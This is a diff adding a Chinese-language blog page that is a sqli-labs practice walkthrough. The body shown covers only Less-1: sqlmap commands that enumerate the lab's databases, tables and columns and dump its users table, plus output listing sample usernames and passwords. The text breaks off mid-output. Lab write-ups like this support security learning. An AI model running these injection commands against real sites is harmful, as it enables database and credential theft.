@@ -1,0 +1,1445 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="# Less-1 date:2020-11-16 21:29:27 # 过程 根据题目提示：Please input the ID as parameter with numeric value ，注入点为 id # sqlmap： 123456789101112131415161718192021222324252627282930爆库:py sqlmap.py -u http:&#x2F;&#x2F;www.sq">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs基础关卡">
+<meta property="og:url" content="http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/index.html">
+<meta property="og:site_name" content="Milkii0的秘密花园">
+<meta property="og:description" content="# Less-1 date:2020-11-16 21:29:27 # 过程 根据题目提示：Please input the ID as parameter with numeric value ，注入点为 id # sqlmap： 123456789101112131415161718192021222324252627282930爆库:py sqlmap.py -u http:&#x2F;&#x2F;www.sq">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-11-16T13:29:27.000Z">
+<meta property="article:modified_time" content="2021-07-04T02:09:05.121Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="sql注入靶场">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>sqli-labs基础关卡</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Milkii0的秘密花园" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/11/25/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/10/30/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/&text=sqli-labs基础关卡"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/&title=sqli-labs基础关卡"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/&is_video=false&description=sqli-labs基础关卡"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli-labs基础关卡&body=Check out this article: http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/&title=sqli-labs基础关卡"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/&title=sqli-labs基础关卡"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/&title=sqli-labs基础关卡"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/&title=sqli-labs基础关卡"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/&name=sqli-labs基础关卡&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/11/16/sqli-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/&t=sqli-labs基础关卡"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#less-1"><span class="toc-number">1.</span> <span class="toc-text"> Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.1.1.</span> <span class="toc-text"> sqlmap：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 手工注入：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-2"><span class="toc-number">2.</span> <span class="toc-text"> Less-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-2"><span class="toc-number">2.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-2"><span class="toc-number">2.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-2"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">2.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-3"><span class="toc-number">3.</span> <span class="toc-text"> Less-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-3"><span class="toc-number">3.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-3"><span class="toc-number">3.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-3"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">3.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-4"><span class="toc-number">4.</span> <span class="toc-text"> Less-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-4"><span class="toc-number">4.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-4"><span class="toc-number">4.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-4"><span class="toc-number">4.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-number">4.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-5"><span class="toc-number">5.</span> <span class="toc-text"> Less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-5"><span class="toc-number">5.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-5"><span class="toc-number">5.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-5"><span class="toc-number">5.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-5"><span class="toc-number">5.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-6"><span class="toc-number">6.</span> <span class="toc-text"> Less-6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-6"><span class="toc-number">6.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-6"><span class="toc-number">6.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-6"><span class="toc-number">6.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-6"><span class="toc-number">6.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-7"><span class="toc-number">7.</span> <span class="toc-text"> Less-7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-7"><span class="toc-number">7.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-7"><span class="toc-number">7.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-7"><span class="toc-number">7.1.2.</span> <span class="toc-text"> 手工注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-7"><span class="toc-number">7.1.3.</span> <span class="toc-text"> 总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-8"><span class="toc-number">8.</span> <span class="toc-text"> Less-8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-8"><span class="toc-number">8.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-8"><span class="toc-number">8.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-8"><span class="toc-number">8.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-8"><span class="toc-number">8.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-9"><span class="toc-number">9.</span> <span class="toc-text"> Less-9</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-9"><span class="toc-number">9.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-9"><span class="toc-number">9.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-9"><span class="toc-number">9.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-9"><span class="toc-number">9.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-10"><span class="toc-number">10.</span> <span class="toc-text"> Less-10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-10"><span class="toc-number">10.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-10"><span class="toc-number">10.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-10"><span class="toc-number">10.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-10"><span class="toc-number">10.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-11"><span class="toc-number">11.</span> <span class="toc-text"> Less-11</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-11"><span class="toc-number">11.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-11"><span class="toc-number">11.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-11"><span class="toc-number">11.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-11"><span class="toc-number">11.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-12"><span class="toc-number">12.</span> <span class="toc-text"> Less-12</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-12"><span class="toc-number">12.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-12"><span class="toc-number">12.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-12"><span class="toc-number">12.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-12"><span class="toc-number">12.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-13"><span class="toc-number">13.</span> <span class="toc-text"> Less-13</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-13"><span class="toc-number">13.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-13"><span class="toc-number">13.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-13"><span class="toc-number">13.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-13"><span class="toc-number">13.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-14"><span class="toc-number">14.</span> <span class="toc-text"> Less-14</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-14"><span class="toc-number">14.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-14"><span class="toc-number">14.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-14"><span class="toc-number">14.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-14"><span class="toc-number">14.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-15"><span class="toc-number">15.</span> <span class="toc-text"> Less-15</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-15"><span class="toc-number">15.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-15"><span class="toc-number">15.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-15"><span class="toc-number">15.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-15"><span class="toc-number">15.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-16"><span class="toc-number">16.</span> <span class="toc-text"> Less-16</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-16"><span class="toc-number">16.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-16"><span class="toc-number">16.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-16"><span class="toc-number">16.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-16"><span class="toc-number">16.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-17sqlmaping"><span class="toc-number">17.</span> <span class="toc-text"> Less-17（sqlmaping）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-17"><span class="toc-number">17.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-17"><span class="toc-number">17.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-17"><span class="toc-number">17.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-17"><span class="toc-number">17.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-18"><span class="toc-number">18.</span> <span class="toc-text"> Less-18</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-18"><span class="toc-number">18.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-18"><span class="toc-number">18.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-18"><span class="toc-number">18.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-18"><span class="toc-number">18.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-19"><span class="toc-number">19.</span> <span class="toc-text"> Less-19</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-19"><span class="toc-number">19.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-19"><span class="toc-number">19.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-19"><span class="toc-number">19.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-19"><span class="toc-number">19.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-20"><span class="toc-number">20.</span> <span class="toc-text"> Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-20"><span class="toc-number">20.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-20"><span class="toc-number">20.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-20"><span class="toc-number">20.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-20"><span class="toc-number">20.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-21"><span class="toc-number">21.</span> <span class="toc-text"> Less-21</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-21"><span class="toc-number">21.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-21"><span class="toc-number">21.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-21"><span class="toc-number">21.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-21"><span class="toc-number">21.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-22"><span class="toc-number">22.</span> <span class="toc-text"> Less-22</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-22"><span class="toc-number">22.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-22"><span class="toc-number">22.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-22"><span class="toc-number">22.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-22"><span class="toc-number">22.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        sqli-labs基础关卡
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-16T13:29:27.000Z" itemprop="datePublished">2020-11-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%A4%A7%E5%86%92%E9%99%A9/">大冒险</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/" rel="tag">sql注入靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="less-1"><a class="markdownIt-Anchor" href="#less-1">#</a> Less-1</h1>
+<p>date:2020-11-16 21:29:27</p>
+<h2 id="过程"><a class="markdownIt-Anchor" href="#过程">#</a> 过程</h2>
+<p>根据题目提示：Please input the ID as parameter with numeric value ，注入点为 id</p>
+<h3 id="sqlmap"><a class="markdownIt-Anchor" href="#sqlmap">#</a> sqlmap：</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">爆库:</span><br><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 --dbs --batch</span><br><span class="line">爆表：</span><br><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security --tables --batch</span><br><span class="line">爆字段:</span><br><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users --columns --batch</span><br><span class="line">爆字段值:</span><br><span class="line">py sqlmap.py -u http://www.sqli-labs.com/Less-1?id=1 -D security -T users -C id,password,username --dump --batch</span><br><span class="line"></span><br><span class="line">拿到数据，别的表同理：</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   